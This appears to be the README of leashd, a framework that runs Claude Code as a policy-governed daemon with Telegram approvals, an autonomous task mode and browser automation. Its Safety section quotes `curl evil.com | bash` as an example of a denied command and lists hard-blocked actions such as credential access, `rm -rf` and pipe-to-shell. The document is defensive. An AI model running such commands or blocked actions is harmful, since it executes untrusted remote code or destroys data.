# leashd

**Safety-first agentic coding framework. Run Claude Code as a background daemon — govern it with policy rules, approve actions from your phone, or let it run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation.**

[![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![Coverage 89%+](https://img.shields.io/badge/coverage-89%25%2B-brightgreen.svg)](#development)
[![Status: Alpha](https://img.shields.io/badge/status-alpha-orange.svg)](#status)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)

---

leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching Claude Code. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you touching your phone. Everything is logged to an append-only audit trail.

The result: a coding workflow that scales from phone-supervised pair programming to fully autonomous task execution, with guardrails you define.

---

## How It Works

### Interactive Mode

```
Your phone (Telegram)
        │
        ▼
   leashd daemon          ← runs in background on your dev machine
        │
        ├─ 1. Sandbox       ← path-scoped: blocks anything outside approved dirs
        ├─ 2. Policy rules  ← YAML: allow / deny / require_approval per tool/command
        └─ 3. Human gate    ← Approve / Reject buttons sent to your Telegram
                │
                ▼
         Claude Code agent  ← reads files, writes code, runs tests
```

### Autonomous Mode

```
/task "Add health check endpoint"  (Telegram)
        │
        ▼
   Task Orchestrator
        │
        ├─ spec          ← analyzes task, writes specification
        ├─ explore        ← reads codebase structure and conventions
        ├─ validate       ← checks spec against codebase findings
        ├─ plan           ← creates implementation plan
        ├─ implement      ← writes code (file writes auto-approved)
        ├─ test           ← runs test suite via TestRunnerPlugin
        ├─ retry (×3)     ← fixes failures with exponential backoff
        └─ pr             ← creates PR via gh CLI
                │
                ▼
   You get a PR link — or an escalation message if the agent gets stuck
```

AI approval replaces human taps: a `claude -p` CLI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.

Sessions are **multi-turn**: Claude remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").

---

## Quick Start

### Prerequisites

- **Python 3.10+**
- **[Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)** — installed and authenticated. The `claude` command must work in your terminal.
- **Telegram account** — to create a bot

### 1. Install

```bash
pip install leashd
```

Or with [uv](https://docs.astral.sh/uv/) (recommended):

```bash
uv tool install leashd
```

### 2. Create a Telegram bot

1. Open Telegram and search for **@BotFather**
2. Send `/newbot` and follow the prompts
3. Copy the **token** BotFather gives you (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
4. Message **@userinfobot** to get your numeric **user ID** (e.g. `981234567`) — this restricts the bot to only you

### 3. Run the setup wizard

```bash
leashd init
```

The wizard prompts you for your approved directory/directories and optional Telegram credentials, and writes `~/.leashd/config.yaml`. No manual config file editing needed.

### 4. Start the daemon

```bash
leashd start
```

leashd starts in the background. Check it with `leashd status`, stop it with `leashd stop`.

### 5. Start coding from your phone

Open Telegram, find your bot, and send something like:

> "Add a health check endpoint to the FastAPI app"

Claude starts working. When it needs to do something gated by policy (e.g. write a file), you'll get an **Approve / Reject** button in the chat.

---

## What's New in 0.7.0

**`/web` command** — autonomous web automation with content-level human approval. Send `/web check my GitHub notifications` or `/web linkedin_comment --topic "AI"` from Telegram. The agent navigates, reads, and acts — proposing content via `AskUserQuestion` for your approval before executing.

**Two browser backends** — choose between [Playwright MCP](https://github.com/playwright-community/mcp) (default) and [agent-browser](https://github.com/vercel-labs/agent-browser) (Vercel's Rust-powered browser CLI). Switch with `leashd browser set-backend agent-browser`. Both integrate with the same safety pipeline and persistent browser profiles.

**Browser profile persistence** — persistent login sessions across `/web` invocations via Chrome user data directories. Configure with `leashd browser set-profile`, view with `leashd browser show`, clear with `leashd browser clear-profile`. Use `/web --fresh` to skip the profile for a one-off clean session.

**Configurable thinking effort** — control Claude's reasoning depth. Manage it at runtime with `leashd effort show` and `leashd effort set <level>`.

**Per-mode turn limits** — `/web` and `/test` commands get higher default turn limits (`LEASHD_WEB_MAX_TURNS=300`, `LEASHD_TEST_MAX_TURNS=200`) to accommodate browser-heavy research and multi-phase test workflows, independent of the global `LEASHD_MAX_TURNS=150`.

**Agent timeout pauses during interactions** — user think time (plan review, questions, tool approvals) no longer counts against the 60-minute agent timeout. Plan adjustments restart with a fresh timer.

**Git security hardening** — sandbox validation on git add callbacks, `..` rejection in branch names, and whitespace stripping to prevent path traversal.

See [CHANGELOG.md](CHANGELOG.md) for the full history.

---

## Daemon Mode

leashd runs as a background process by default.

```bash
leashd start           # start daemon (background)
leashd start -f        # start in foreground (useful for debugging)
leashd status          # check if daemon is running
leashd stop            # graceful shutdown
leashd restart         # stop + start
leashd reload          # reload config without restart (SIGHUP)
leashd version         # print version and exit
```

Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change the path.

---

## Autonomous Mode

Autonomous mode replaces manual approval taps and plan reviews with AI evaluation, adds a post-task test-and-retry loop, and drives multi-phase autonomous tasks through the task orchestrator. Send `/task <description>` from Telegram and come back to a PR — or an escalation message if the agent gets stuck.

```bash
leashd autonomous          # show current autonomous settings
leashd autonomous setup    # run autonomous config wizard
leashd autonomous enable   # quick-enable with defaults
leashd autonomous disable  # disable autonomous mode
```

### Three Guarantees

1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. The AI approver only handles `require_approval` decisions, never `deny` decisions.
2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session.
3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. No decision is invisible.

### Task Orchestrator vs Autonomous Loop

| Aspect | `/task` (Task Orchestrator) | `/edit` (Autonomous Loop) |
|---|---|---|
| **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
| **Phases** | spec → explore → validate → plan → implement → test → PR | Single-shot: implement → test → retry |
| **Planning** | Automatic spec and plan generation with validation | No planning — goes straight to implementation |
| **Crash recovery** | Full — resumes from current phase after restart | None — starts over |
| **Cost tracking** | Per-phase breakdown and total | Session-level only |

See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for a full walkthrough and the [Autonomous Mode Reference](docs/autonomous-mode.md) for the technical details.

---

## Configuration

leashd is configured primarily through CLI commands — no manual file editing needed. Run `leashd init` once, then use subcommands for everything else.

### Setup and inspection

```bash
leashd init       # first-time setup wizard — writes ~/.leashd/config.yaml
leashd config     # show resolved config (all layers merged)
```

### Approved directories

```bash
leashd add-dir /path/to/project    # approve a directory
leashd remove-dir /path/to/project # revoke approval
leashd dirs                         # list approved directories
```

### Autonomous mode

```bash
leashd autonomous setup    # guided setup for autonomous features
leashd autonomous enable   # quick-enable with defaults
leashd autonomous disable  # disable autonomous mode
leashd autonomous show     # show current autonomous config
```

### Browser

```bash
leashd browser show                                  # show backend and profile
leashd browser set-backend agent-browser              # switch browser backend
leashd browser set-profile ~/.leashd/browser-profile  # set persistent profile
leashd browser clear-profile                           # remove profile
leashd browser headless                                # toggle headless mode
```

### Thinking effort

```bash
leashd effort show       # display current effort level
leashd effort set high   # set effort level (low, medium, high, max)
```

### Skills

```bash
leashd skill list              # list installed skills (default)
leashd skill add skill.zip     # install from zip archive
leashd skill remove my-skill   # uninstall a skill
leashd skill show my-skill     # show skill details
```

### Workspaces

```bash
leashd ws add my-saas ~/src/api ~/src/web   # create a workspace
leashd ws add my-saas ~/src/worker           # add a dir to existing workspace
leashd ws list                               # list all workspaces
leashd ws show my-saas                       # inspect repos in a workspace
leashd ws remove my-saas ~/src/worker        # remove a dir from workspace
leashd ws remove my-saas                     # remove entire workspace
```

Workspaces group related repos so the agent gets multi-repo context. `CLAUDE.md` files from all workspace directories are loaded via SDK `add_dirs`.

### Workflows

```bash
leashd workflow list         # list available playbooks
leashd workflow show <name>  # show playbook details
```

Place YAML playbooks in `.leashd/workflows/` (project) or `~/.leashd/workflows/` (global).

### Maintenance

```bash
leashd clean    # remove all runtime artifacts
leashd reload   # reload config without restart (SIGHUP)
```

### Config layering

leashd uses a layered config system — each layer overrides the one before it:

```
~/.leashd/config.yaml   ← global base (managed by leashd init / CLI commands)
.env in your project    ← per-project overrides
environment variables   ← highest priority
```

### Advanced: environment variables

All settings are environment variables prefixed with `LEASHD_`. Most are managed by the CLI commands above, but these are commonly set directly in `.env` or as env vars:

| Variable | Default | Description |
|---|---|---|
| `LEASHD_TELEGRAM_BOT_TOKEN` | — | Bot token from @BotFather. Without this, leashd runs in local CLI mode. |
| `LEASHD_ALLOWED_USER_IDS` | *(no restriction)* | Comma-separated Telegram user IDs that can use the bot. |
| `LEASHD_SYSTEM_PROMPT` | — | Custom system prompt appended to the agent. |
| `LEASHD_POLICY_FILES` | built-in `default.yaml` | Comma-separated paths to YAML policy files. |
| `LEASHD_MAX_TURNS` | `150` | Max conversation turns per request. |
| `LEASHD_APPROVAL_TIMEOUT_SECONDS` | `300` | Seconds to wait for approval before auto-denying. |
| `LEASHD_MCP_SERVERS` | `{}` | JSON dict of MCP server configurations. |
| `LEASHD_DEFAULT_MODE` | `default` | Default session mode: `"default"`, `"plan"`, or `"auto"`. |

See [docs/configuration.md](docs/configuration.md) for the full environment variable reference (40+ settings).

---

## Safety

Every tool call Claude makes passes through a three-layer pipeline before it can execute:

**1. Sandbox** — The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Path traversal attempts are blocked immediately and logged as security violations.

**2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.

**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). If no response within the timeout, the action is auto-denied.

Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision, every approver type.

### Built-in policies

leashd ships five policies in `policies/`:

**`default.yaml`** *(recommended)* — balanced for everyday use.
- Auto-allows: file reads, search, grep, git status/log/diff, read-only browser tools
- Requires approval: file writes/edits, git push/rebase/merge, network commands, browser mutations
- Hard-blocks: credential file access, `rm -rf`, `sudo`, force push, pipe-to-shell, SQL DROP/TRUNCATE

**`strict.yaml`** — maximum safety, more approval taps.
- Auto-allows: only reads (`Read`, `Glob`, `Grep`, `LS`)
- Requires approval: everything else
- 2-minute approval timeout

**`permissive.yaml`** — for trusted environments where you want minimal interruptions.
- Auto-allows: reads, writes, package managers, test runners, git add/commit/stash, all browser tools
- Requires approval: git push, network commands, anything not explicitly listed
- 10-minute approval timeout

**`dev-tools.yaml`** *(overlay)* — auto-allows common dev commands. Loaded alongside `default.yaml` by default.
- Auto-allows: linters (`ruff`, `eslint`, `prettier`), test runners (`pytest`, `jest`, `vitest`), package managers (`npm install`, `pip install`, `uv sync`, `cargo build`)

**`autonomous.yaml`** — for fully autonomous operation with [task orchestrator](docs/autonomous-setup-guide.md).
- Auto-allows: file writes, test runners, linters, package managers, safe git, GitHub CLI PR
- AI-evaluated: git push (feature branches), network commands, browser mutations
- Hard-blocks: credentials, force push, push to main/master, `rm -rf`, `sudo`, pipe-to-shell

Switch policies (in your `.env` or as an env var):

```env
LEASHD_POLICY_FILES=policies/strict.yaml
```

Combine multiple policy files (rules merged, evaluated in order):

```env
LEASHD_POLICY_FILES=policies/default.yaml,policies/my-overrides.yaml
```

---

## Telegram Commands

Once the daemon is running and your bot is set up, these slash commands are available in chat:

| Command | Description |
|---|---|
| `/plan <text>` | Switch to plan mode and start — Claude proposes, you approve before execution |
| `/edit <text>` | Switch to edit mode and start — direct implementation |
| `/default` | Switch back to balanced default mode |
| `/dir` | Switch working directory (inline buttons) |
| `/git <subcommand>` | Full git suite: status, branch, checkout, diff, log, add, commit, push, pull |
| `/web <instruction>` | Autonomous web automation with content-level human approval |
| `/test` | 9-phase agent-driven test workflow with browser automation |
| `/task <description>` | Autonomous multi-phase task: spec → explore → plan → implement → test → PR |
| `/tasks` | List active and recent tasks for the current chat |
| `/stop` | Stop all ongoing work (agent, task, loop) without resetting session |
| `/cancel` | Cancel the active task in the current chat |
| `/ws` | Manage workspaces inline |
| `/status` | Show current session, mode, and directory |
| `/clear` | Clear conversation history, cancel active tasks, and start fresh |

---

## Workspaces

Workspaces group related repositories so the agent gets multi-repo context across all of them simultaneously. Configure workspaces via `leashd ws` — see [Configuration > Workspaces](#workspaces) for the full command reference. When active, `CLAUDE.md` files from all workspace directories are loaded and the agent's system prompt includes multi-repo context.

---

## Session Persistence

By default, sessions are stored in SQLite (`.leashd/messages.db`) and persist across daemon restarts — Claude remembers conversation context between sessions. Every message is stored with cost, duration, and session metadata.

For development or testing, use in-memory storage (in `.env`):

```env
LEASHD_STORAGE_BACKEND=memory
```

---

## Browser Automation

leashd supports two browser backends for the `/web` and `/test` commands — both gated by the same safety pipeline:

| Backend | Install | Best for |
|---|---|---|
| [Playwright MCP](https://github.com/playwright-community/mcp) *(default)* | `npx playwright install chromium` | Test generation, MCP-native tooling |
| [agent-browser](https://github.com/vercel-labs/agent-browser) | `npm install -g agent-browser && agent-browser install` | Fast Rust CLI, snapshot-based refs, cloud browser providers |

Switch backends and manage profiles via `leashd browser` — see [Configuration > Browser](#browser) for all commands.

**Playwright MCP** — the `.mcp.json` at the project root pre-configures Claude Code to spawn the Playwright MCP server. Read-only browser tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutation tools (click, navigate, type) require approval.

**agent-browser** — Vercel’s headless browser CLI with a native Rust binary and Node.js fallback. Uses accessibility-tree snapshots with deterministic element refs (`@e1`, `@e2`) for reliable AI-driven interaction. Supports cloud providers (Browserbase, Browser Use, Kernel) and iOS Simulator via the `-p` flag.

See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths by OS, the full tool reference, and policy details.

### Typical workflow

1. Start your dev server (`npm run dev`, `uvicorn`, etc.)
2. In Telegram: `/test --url http://localhost:3000`
3. Claude navigates, verifies, and reports — each mutation tap needs your approval

Or use the `/web` command for general web automation:

1. In Telegram: `/web check my GitHub notifications`
2. Claude navigates using your persistent browser profile, reads content, and reports back
3. Any actions (commenting, clicking) are proposed via `AskUserQuestion` for your approval

---

## Streaming

Telegram responses stream in real time — the message updates progressively as Claude types. While tools are running, you see a live indicator (e.g., `🔧 Bash: pytest tests/`). The final message includes a tool usage summary (e.g., `🧰 Bash ×3, Read, Glob`).

Disable in `.env`:

```env
LEASHD_STREAMING_ENABLED=false
```

---

## CLI Mode

No Telegram token? leashd falls back to a local REPL — useful for testing your config before going mobile:

```bash
# Don't set LEASHD_TELEGRAM_BOT_TOKEN, then:
leashd start -f
# > type your prompts here
```

Note: actions requiring approval are auto-denied in CLI mode since there's no approval UI.

---

## Logging

leashd uses [structlog](https://www.structlog.org/) for structured logging. Set log level in `.env`:

```env
LEASHD_LOG_LEVEL=DEBUG     # full trace including policy decisions
LEASHD_LOG_LEVEL=INFO      # default — operational events
LEASHD_LOG_LEVEL=WARNING   # warnings and errors only
```

File logging (JSON, rotating) is enabled by default:

```env
LEASHD_LOG_DIR=~/.leashd/logs
```

Key log event sequence at `INFO`:

```
engine_building → engine_built → daemon_starting → session_created →
request_started → agent_execute_started → agent_execute_completed →
request_completed
```

---

## Architecture

leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the Claude Code agent, and sends responses back. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes. The **TaskOrchestrator** and **AutonomousLoop** plug into the event bus as autonomous execution plugins.

```
Telegram connector
      │
   Middleware (auth, rate limit)
      │
   Engine ──── EventBus ──── TaskOrchestrator
      │                       AutonomousLoop
   Gatekeeper ──────────────────────────────┐
      │                                     │
   Claude Code agent             1. Sandbox check
      │                          2. Policy rule match
      └── tool call ──────────▶  3. Human / AI approval
```

---

## Development

```bash
# Clone and install (including dev dependencies)
git clone git@github.com:vmehera123/leashd.git && cd leashd
uv sync

# Run tests
uv run pytest tests/
uv run pytest tests/test_policy.py -v          # single file
uv run pytest --cov=leashd tests/              # with coverage

# Lint and format
uv run ruff check .
uv run ruff check --fix .
uv run ruff format .
```

---

## Status

leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine, task orchestrator) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.

If you hit a bug or have a feature idea, [open an issue](https://github.com/vmehera123/leashd/issues).

---

## License

[Apache 2.0](LICENSE)
